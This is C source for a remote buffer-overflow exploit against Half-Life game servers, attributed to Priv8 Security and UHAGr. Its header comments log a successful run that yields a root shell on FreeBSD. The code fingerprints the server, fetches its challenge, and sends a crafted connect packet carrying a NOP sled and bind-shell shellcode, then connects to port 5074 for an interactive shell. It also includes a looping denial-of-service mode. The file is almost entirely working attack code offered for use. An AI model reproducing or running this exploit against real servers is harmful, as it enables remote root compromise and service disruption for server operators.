//
// PRIV8 SECURITY & UHAGr CONFIDENTIAL SOURCE - DO NOT DISTRIBUTE !!!
// Halflife <= 1.1.1.0 , 3.1.1.1c1 and 4.1.1.1a exploit 
// Code by hkvig of UHAGr and wsxz of Priv8 Security
//
// This code is based upon the recent halflife exploit but it is
// not a dos. Instead this exploit provides you a nice shell to
// the vulnerable host
//
// 
// LOGS OF SUCCESSFUL EXPLOITATION
//
// [wsxz@localhost xdcc]$ ./hl 0 192.168.0.4
//
//
// PRIV8 SECURITY & UHAGr CONFIDENTIAL EXPLOIT - DO NOT DISTRIBUTE !!!
// Halflife <= 1.1.1.0 , 3.1.1.1c1 and 4.1.1.1a exploit
// Code by hkvig of UHAGr and wsxz of Priv8 Security
// Greetings to #priv8security & #!uhagr people
// 
// [+] Looking up host ip addr
// [+] Establishing virtual udp connection
// [+] Getting server info
// [+] Server protocol 0x2e
//     Players         0
//     Proxy           0
//     Lan             0
//     Nplayers        0x10
//     Directory       cstrike
//     Description     CounterStrike
//     Host            Counter-Strike 1.5 Server
//     Type            0
//     Pass            0
//     Os              0
//     Security        0x1
// [+] Getting server challenge integer
//     Server challenge is 280135011
// [+] Exploiting halflife server
// [+] Connecting to our shell
// Linux freebsd.rlz 2.4.2 FreeBSD 5.1-RELEASE #0: Thu Jun  5 02:55:42 GMT 2003
//     root@wv i386 unknown
// uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
//
//
// Greetings fly to
//	- The rest UHAGr and Priv8 Security people
//	- CCC 
//	- All of our friends to any net
// 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/socket.h>
#include <linux/sockios.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

#define LOCAL_PORT ( getuid() + getpid() + rand())
#define DEST_PORT 27015
#define BUFFER_SIZE 4096
#define DELAY 20 
#define INIT "echo; echo; uname -a; id; who; echo; echo;\n"

// The packet layout for a bsd host
#define PAYLOAD     "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66" \
                    "\xcd\x80\x31\xd2\x52\x66\x68\x13\xd2\x43\x66\x53\x89\xe1" \
                    "\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04" \
                    "\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66" \
                    "\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6" \
                    "\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53" \
                    "\x89\xe1\xb0\x0b\xcd\x80" \
                    "\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62" \
                    \
                    "\x42\x42\x42\x42"

#define NAME        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
                    "\x90\x90\x90\xeb\x08"

#define BUFFER "\xff\xff\xff\xff" \
               "connect %d" \
               " %s \"" \
               "\\prot\\2" \
               "\\unique\\-1" \
               "\\raw\\%08lx%08lx%08lx%08lx" \
               "\" \"" \
               "\\model\\robo" \
               "\\topcolor\\25" \
               "\\bottomcolor\\161" \
               "\\rate\\9999.000000" \
               "\\cl_updaterate\\20" \
               "\\cl_lw\\1" \
               "\\cl_lc\\1" \
               "\\cl_dlmax\\128" \
               "\\hud_classautokill\\1" \
               "\\name\\" NAME \
               "\\" PAYLOAD "\\value" \
               "\"\n"


// The structure that holds the server info needed for the exploitation
struct serverinfo
{
	unsigned int protocol;                   // Protocol version
	unsigned int players;                    // Current players
	unsigned int proxytarget;                // Proxy
	unsigned int lan;                        // Lan
	unsigned int nplayers;                   // Players
	char *directory;                         // Current directory
	char *description;                       // Server description
	char *host;                              // Hosts alias
	char *challenge;                         // Challenge integer
	unsigned int type;                       // Server type
	unsigned int pass;                       // Server pass
	unsigned int os;                         // Os
	unsigned int security;                   // Security
} server;


// The structure that contains the targets
struct target
{
        unsigned int id;
        const char *description;
        unsigned long int retaddr;
} 
targets[] =
{
        { 0 , "Freebsd 5.1" , 0xbfbfe398  } ,

	{ 1 , "DoS attack to every OS" , 0x41414141 } ,

        { 2 , NULL , 0 }
};


// This function lists the available targets
void list( void )
{
int loop = 0;

	fprintf( stdout , "\n\nAvailable targets\n" );
	while( targets[loop].description != NULL )
	{
	fprintf( stdout , "\t%d\t%s\n" , targets[loop].id , targets[loop].description );
	loop++;
	}
	fprintf( stdout , "\n\n" );
	
	return;
}


// This function is responsible for the proper error reporting and
// error code returning
void do_exit( const char *str , const char *file , unsigned int line )
{
        fprintf( stdout , "\n" );
        if( file != NULL && line != 0 )
                fprintf( stdout , "Error at %s at line %d\n" , file , line );

        if( str != NULL )
                perror( str );

        exit( -errno );
}


// A safer version of the standard strtok() function
char *strtokerr( char *str , const char *del )
{
char *ptr;

        if(( ptr = strtok( str , del )) == NULL )
        {
	fprintf( stdout , "Error at %s at line %d\n" , __FILE__ , __LINE__ );
	fprintf( stdout , "strtokerr(): strtok(): No such token\n" );
	do_exit( NULL , NULL , 0 );
	}

        return ptr;
}


// This function is responsible for looking the ip addr of the target host 
unsigned long int lookup_host( char *host )
{
struct in_addr r_host;
struct hostent *ip;

	if( !isdigit( *host ))
	{
        	if(( ip = gethostbyname( host )) == NULL )
			do_exit( "lookup_host(): gethostbyname()" , __FILE__ , __LINE__ );

        	bzero( &r_host , sizeof( struct in_addr ));
        	r_host = *(( struct in_addr *)ip->h_addr );
        	return r_host.s_addr;
	}

	if( isdigit( *host ))
        	return inet_addr( host );

	return -1;
}


// This function establishes a virtual udp connection to the target
// host so that send() can be used instead of sendto()
int udp_connect( unsigned long int addr , unsigned int port )
{
int fd;
struct sockaddr_in host;
struct in_addr n_addr = *(( struct in_addr *)&addr );

        if(( fd = socket( PF_INET , SOCK_DGRAM , IPPROTO_UDP )) == -1 )
        	do_exit( "udp_connect(): socket()" , __FILE__ , __LINE__ );

        host.sin_family = AF_INET;
        host.sin_addr.s_addr = INADDR_ANY;
        host.sin_port = htons( LOCAL_PORT );
        if(( bind( fd , ( struct sockaddr *)&host , sizeof( struct sockaddr ))) == -1 )
		do_exit( "udp_connect(): bind()" , __FILE__ , __LINE__ );

        bzero( &host , sizeof( struct sockaddr_in ));
        host.sin_family = AF_INET;
        host.sin_addr = n_addr;
        host.sin_port = htons( port );
        if(( connect( fd , ( struct sockaddr *)&host , sizeof( struct sockaddr ))) == -1 )
		do_exit( "udp_connect(): connect()" , __FILE__ , __LINE__ );

	return fd;
}


// This is the standard tcp connection in just one function
int tcp_connect( unsigned long int addr , int port )
{
struct sockaddr_in host;
int fd;

        if(( fd = socket( PF_INET , SOCK_STREAM , IPPROTO_TCP )) == -1 )
		do_exit( "tcp_connect(): socket()" , __FILE__ , __LINE__ );

        host.sin_family = AF_INET;
        host.sin_addr.s_addr = INADDR_ANY;
        host.sin_port = htons( LOCAL_PORT );

        if(( bind( fd , ( struct sockaddr *)&host , sizeof( struct sockaddr ))) == -1 )
		do_exit( "tcp_connect(): bind()" , __FILE__ , __LINE__ );

        bzero( &host , sizeof( struct sockaddr_in ));
        host.sin_family = AF_INET;
        host.sin_addr.s_addr = addr;
        host.sin_port = htons( port );

	if(( connect( fd , ( struct sockaddr *)&host , sizeof( struct sockaddr ))) == -1 )
		do_exit( "tcp_connect(): connect()" , __FILE__ , __LINE__ );

	return fd;
}

// The standard function for controlling the shell
int shell( int fd )
{
int bytes;
char buffer[2048];
fd_set descr;
struct timeval time = { 2 , 0 };

        while( 1 )
        {
        	FD_ZERO( &descr );
        	FD_SET( fd , &descr );
        	FD_SET( 0 , &descr );
        	select( fd + 1 , &descr , NULL , NULL , NULL );

        	if( FD_ISSET( fd , &descr ))
        	{
                	bzero( buffer , sizeof( buffer ));
                	if(( bytes = read( fd , buffer , sizeof( buffer ))) == -1 )
                	{
                	fprintf( stdout , "[-] Connection closed by foreign host\n" );
                	do_exit( "shell(): read()" , __FILE__ , __LINE__ );
                	}
                	buffer[bytes] = '\0';
                	fputs( buffer , stdout );
        	}

		if( FD_ISSET( 0 , &descr ))
        	{
                	bzero( buffer , sizeof( buffer ));
                	if(( bytes = read( 0 , buffer , sizeof( buffer ))) == -1 )
                        	do_exit( "shell(): read()" , __FILE__ , __LINE__ );
                	buffer[bytes] = '\0';
                	send( fd , buffer , strlen( buffer ) , 0 );
        	}
        }

        return 0;
}


// This function gets the server info needed for the exploitation and checks
// if the host is vulnerable
int server_info( int fd )
{
char infostr[] = "\xff\xff\xff\xffinfostring\n\0";
char buffer[BUFFER_SIZE];
char *ptr;
int loop , bytes;

	bzero( buffer , sizeof( buffer ));

	if(( send( fd , infostr , sizeof( infostr ) - 1 , 0 )) == -1 )
		do_exit( "server_info(): send()" , __FILE__ , __LINE__ );

	if(( bytes = read( fd , buffer , sizeof( buffer ))) == -1 )
		do_exit( "server_info(): read()" , __FILE__ , __LINE__ );

	for( loop = 0; loop < bytes; loop++ )
		if( buffer[loop] == '\0' ) buffer[loop] = 0x41;
	
	if(( ptr = strstr( buffer , "protocol" )) == NULL ) 	
	{
	fprintf( stdout , "[-] No protocol info into server response\n" );
	do_exit( NULL , NULL , 0 );
	}

	ptr = strtokerr( buffer , "\\" );                       // Ignoring response
	ptr = strtokerr( NULL , "\\" );                         // Protocol version
	server.protocol = atoi( strtokerr( NULL , "\\" ));

	ptr = strtokerr( NULL , "\\" );                         // Address
	ptr = strtokerr( NULL , "\\" );                         // Ip address and port

	ptr = strtokerr( NULL , "\\" );                         // Players
	server.players = atoi( strtokerr( NULL , "\\" ));       // Current players

	ptr = strtokerr( NULL , "\\" );                         // Proxytarget
	server.proxytarget = atoi( strtokerr( NULL , "\\" ));   // Proxytarget value

	ptr = strtokerr( NULL , "\\" );                         // Lan
	server.lan = atoi( strtokerr( NULL , "\\" ));           // Lan value

	ptr = strtokerr( NULL , "\\" );                         // Max players
	server.nplayers = atoi( strtokerr( NULL , "\\" ));      // Max players

	ptr = strtokerr( NULL , "\\" );                         // Directory
	server.directory = strtokerr( NULL , "\\" );            // Directory string

	ptr = strtokerr( NULL , "\\" );                         // Description
	server.description = strtokerr( NULL , "\\" );          // Description string

	ptr = strtokerr( NULL , "\\" );                         // Host
	server.host = strtokerr( NULL , "\\" );                 // Host string

	ptr = strtokerr( NULL , "\\" );                         // Map
	ptr = strtokerr( NULL , "\\" );                         // Map string

	ptr = strtokerr( NULL , "\\" );                         // Type
	server.type = atoi( strtokerr( NULL , "\\" ));          // Type value

	ptr = strtokerr( NULL , "\\" );                         // Pass
	server.pass = atoi( strtokerr( NULL , "\\" ));          // Pass value

	ptr = strtokerr( NULL , "\\" );                         // Os
	server.os = atoi( strtokerr( NULL , "\\" ));            // Os value

	ptr = strtokerr( NULL , "\\" );                         // Security
	server.security = atoi( strtokerr( NULL , "\\" ));      // Security value

	return 0;
}


// This function is responsible for getting the server's challenge in order
// to be used later into the exploitation udp packet
int server_challenge( int fd )
{
char challstr[] = "\xff\xff\xff\xffgetchallenge\n\0";
char buffer[BUFFER_SIZE];

	bzero( buffer , sizeof( buffer ));

	if(( send( fd , challstr , sizeof( challstr ) - 1 , 0 )) == -1 )
		do_exit( "server_challenge(): send()" , __FILE__ , __LINE__ );

	if(( read( fd , buffer , sizeof( buffer ))) == -1 )
		do_exit( "server_challenge(): read()" , __FILE__ , __LINE__ );

	strtokerr( buffer , " " );
	server.challenge = strtokerr( NULL , " " );
	return 0;
}

// This function is responsible for exploiting a bsd host
int do_bof_bsd( int fd , struct target targ , unsigned long int offset )
{
char *exploit , *ptr;
int len;

	targ.retaddr -= offset;

	if(( exploit = ( char *)malloc( BUFFER_SIZE )) == NULL )
		do_exit( "do_bof(): malloc()" , __FILE__ , __LINE__ );
	bzero( exploit , BUFFER_SIZE );

	len = snprintf( exploit , sizeof( BUFFER ) + 64 , BUFFER , server.protocol , server.challenge , 
	              ( long int )( rand() << 1 ) + ( rand() & 0xf ) ,   
                      ( long int )( rand() << 1 ) + ( rand() & 0xf ) ,
                      ( long int )( rand() << 1 ) + ( rand() & 0xf ) ,
                      ( long int )( rand() << 1 ) + ( rand() & 0xf ));

	ptr = strstr( exploit , "BBBB" );
	*( unsigned long int *)ptr = targ.retaddr;

// ptr += 4;
// *( unsigned long int *)ptr = targ.retaddr;
// ptr += 4;
// *( unsigned long int *)ptr = targ.retaddr;
// ptr += 4;
// *( unsigned long int *)ptr = targ.retaddr;
// ptr += 4;
// *( unsigned long int *)ptr = targ.retaddr;

	if(( send( fd , exploit , len , 0 )) == -1 )
		do_exit( "do_bof(): send()" , __FILE__ , __LINE__ );


	return 0;
}

// This function launches a dos attack against the vulnerable server
int do_dos( int fd , unsigned int delay )
{
int len;
char *dos , buff[268];

        if(( dos = ( char *)malloc( BUFFER_SIZE )) == NULL )
                do_exit( "do_dos(): malloc()" , __FILE__ , __LINE__ );

        bzero( dos , BUFFER_SIZE );
        bzero( buff , sizeof( buff ));

        memset( buff , 0x41 , sizeof( buff ));

        len = snprintf( dos , BUFFER_SIZE ,
                              "\xff\xff\xff\xff"
                              "connect %d"
                              " %s \""
                              "\\prot\\2"
                              "\\unique\\-1"
                              "\\raw\\%08lx%08lx%08lx%08lx"
                              "\" \""
                              "\\model\\%s"
                              "\\topcolor\\25"
                              "\\bottomcolor\\161"
                              "\\rate\\9999.000000"
                              "\\cl_updaterate\\20"
                              "\\cl_lw\\1"
                              "\\cl_lc\\1"
                              "\\cl_dlmax\\128"
                              "\\hud_classautokill\\1"
                              "\\name\\Bugtest"
                              "\"\n" ,
                              server.protocol , server.challenge ,
                              ( long int )( rand() << 1 ) + ( rand() & 0xf ) ,
                              ( long int )( rand() << 1 ) + ( rand() & 0xf ) ,
                              ( long int )( rand() << 1 ) + ( rand() & 0xf ) ,
                              ( long int )( rand() << 1 ) + ( rand() & 0xf ) ,
	                      buff );

        while( 1 )
        {
                if(( send( fd , dos , len , 0 )) == -1 )
                        do_exit( "do_dos(): send()" , __FILE__ , __LINE__ );

                fprintf( stdout , "[+] DoS packet sent\n" );
                sleep( delay );
        }


        return 0;
}


int main( int argc , char *argv[] )
{ 
unsigned long int addr;
long int offset;
int fd , usrtarg , port;


	fprintf( stdout , "                                                                  \n\n"
	                  "PRIV8 SECURITY & UHAGr CONFIDENTIAL EXPLOIT - DO NOT DISTRIBUTE !!! \n"
	                  "Halflife <= 1.1.1.0 , 3.1.1.1c1 and 4.1.1.1a exploit                \n"
	                  "Code by hkvig of UHAGr and wsxz of Priv8 Security                   \n"
	                  "Greetings to #priv8security & #!uhagr people                      \n\n" );

	if( argc != 4 && argc != 5 )
	{
		fprintf( stdout , "Usage: %s <Target id> <Host> <Offset> [<Server port>]\n\n"
	                          "Set offset to 0 if you don't like to use an offset\n\n" , argv[0] );
		list();
		return 0;
	}
	
	if( argc == 5 )
	{
		port = atoi( argv[4] );
		fprintf( stdout , "[+] Using port %d\n" , port );
	}
	else
		port = DEST_PORT;

	usrtarg = atoi( argv[1] );
	if( usrtarg >= sizeof( targets ) / sizeof( struct target ) - 1 )
	{
	fprintf( stdout , "[-] No such target in target list\n" );
	do_exit( NULL , NULL , 0 );
	}

        offset = atoi( argv[3] );
        fprintf( stdout , "[+] Using offset %#x + %#x\n" , targets[usrtarg].retaddr , offset );

	bzero( &server , sizeof( struct serverinfo ));

	fprintf( stdout , "[+] Looking up host ip addr\n" );
	addr = lookup_host( argv[2] );	
	sleep( 1 );

	
	fprintf( stdout , "[+] Establishing virtual udp connection\n" );
	fd = udp_connect( addr , port );
	sleep( 1 );	

	
	fprintf( stdout , "[+] Getting server info\n" );
	server_info( fd );
	sleep( 1 );

	fprintf( stdout , "[+] Server protocol %#x\n"
	                  "    Players         %#x\n"
	                  "    Proxy           %#x\n"
	                  "    Lan             %#x\n"
	                  "    Nplayers        %#x\n"
	                  "    Directory       %s \n"
	                  "    Description     %s \n"
	                  "    Host            %s \n"
	                  "    Type            %#x\n"
	                  "    Pass            %#x\n"
	                  "    Os              %#x\n"
	                  "    Security        %#x\n" ,
	                  server.protocol ,
	                  server.players ,
	                  server.proxytarget ,
	                  server.lan ,
	                  server.nplayers ,
	                  server.directory ,
	                  server.description ,
	                  server.host ,
	                  server.type ,
	                  server.pass ,
	                  server.os ,
	                  server.security );

	sleep( 1 );
	fprintf( stdout , "[+] Getting server challenge integer\n" );
	server_challenge( fd );

	fprintf( stdout , "    Server challenge is %s\n" , server.challenge );
	sleep( 1 );


	if( usrtarg == ( sizeof( targets ) / sizeof( struct target )) - 2 ) 
	{ 
		fprintf( stdout , "[+] Starting DoS attack - Ctrl+C to stop\n" );
		do_dos( fd , DELAY );
	}
	else // Real exploitation
	{
		fprintf( stdout , "[+] Exploiting halflife server\n" );
		do_bof_bsd( fd , targets[usrtarg] , offset );
	
		sleep( 1 );
		close( fd );

		sleep( 3 );
		fprintf( stdout , "[+] Connecting to our shell\n" );
		fd = tcp_connect( addr , 5074 );
	
		send( fd , INIT , sizeof( INIT ) , 0 );
		shell( fd );
	}	

	close( fd );
	return 0; 
}
